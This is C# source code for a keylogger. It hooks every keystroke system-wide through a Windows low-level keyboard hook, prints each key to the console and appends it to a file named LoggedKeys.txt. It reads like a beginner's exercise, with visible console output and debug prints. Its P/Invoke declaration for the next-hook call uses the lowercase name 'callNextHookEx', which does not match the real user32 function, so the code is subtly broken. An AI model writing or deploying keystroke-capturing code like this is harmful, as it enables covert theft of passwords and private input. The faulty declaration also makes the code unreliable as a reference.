using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    internal class Program
    {
        private const int WH_KEYBOARD_LL = 13; //Low_Level_keyboard_hook_ID
        private const int WM_KEYDOWN = 0x0100; //message number for key pressed event
        private static LowLevelKeyboardProc _proc = hookCallback; //store the callback function 
        private static IntPtr _hookID = IntPtr.Zero; //store the ID of my installed hook 

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx (int idhook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId); //install my hook


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);  //remove the hook from the chain


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr callNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr hookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN){
                int vkCode = Marshal.ReadInt32 (lParam);
                Console.WriteLine ((ConsoleKey)vkCode);
                Console.WriteLine("before adding text");
                File.AppendAllText("LoggedKeys.txt", ((ConsoleKey)vkCode).ToString());
                Console.WriteLine("After adding text");
            }
            return callNextHookEx(_hookID, nCode, wParam, lParam);
        }
        private static IntPtr SetHook (LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess()) 
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,GetModuleHandle(curModule.ModuleName),0);
            }
        }
        static void Main(string[] args)
        {
            _hookID = SetHook(_proc);
            Console.WriteLine("Keylogger started");
            Console.ReadLine();
            UnhookWindowsHookEx(_hookID);
        }
    }
}
